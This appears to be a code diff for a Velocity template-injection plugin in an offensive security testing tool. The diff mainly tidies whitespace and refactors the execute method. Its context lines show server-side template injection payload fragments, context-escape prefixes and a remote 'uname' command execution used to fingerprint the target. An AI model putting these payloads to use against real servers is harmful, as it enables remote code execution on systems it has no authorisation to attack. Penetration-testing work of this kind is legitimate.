@@ -13,12 +13,12 @@ class Velocity(Plugin):
             'trailer': '\n#set($t=%(trailer)s)\n${t}\n'
         },
         'execute' : {
-        
+
            # I've tested the techniques described in this article
            # http://blog.portswigger.net/2015/08/server-side-template-injection.html
            # for it didn't work. Still keeping the check active to cover previous
            # affected versions.
-        
+
             'call': 'render',
             'execute': """#set($str=$class.inspect("java.lang.String").type)
     #set($chr=$class.inspect("java.lang.Character").type)
@@ -32,21 +32,21 @@ class Velocity(Plugin):
     }
 
     contexts = [
-    
+
             # Text context, no closures
             { 'level': 0 },
-            
+
             { 'level': 1, 'prefix': '%(closure)s)', 'suffix' : '', 'closures' : languages.java_ctx_closures },
-            
-            # This catches 
-            # #if(%s == 1)\n#end 
+
+            # This catches
+            # #if(%s == 1)\n#end
             # #foreach($item in %s)\n#end
             # #define( %s )a#end
             { 'level': 3, 'prefix': '%(closure)s#end#if(1==1)', 'suffix' : '', 'closures' : languages.java_ctx_closures },
             { 'level': 5, 'prefix': '*#', 'suffix' : '#*' },
 
     ]
-    
+
     def detect_engine(self):
 
         # TODO: remove this as already performed on discovery phase
@@ -65,6 +65,6 @@ class Velocity(Plugin):
             self.set('execute', True)
             self.set('os', self.execute("uname"))
 
-    def execute(self, code, prefix = None, suffix = None, blind = False):
+    def execute(self, code, **kwargs):
         # Quote code before submitting it
-        return super(Velocity, self).execute(quote(code), prefix, suffix, blind)
+        return super(Velocity, self).execute(quote(code), **kwargs)
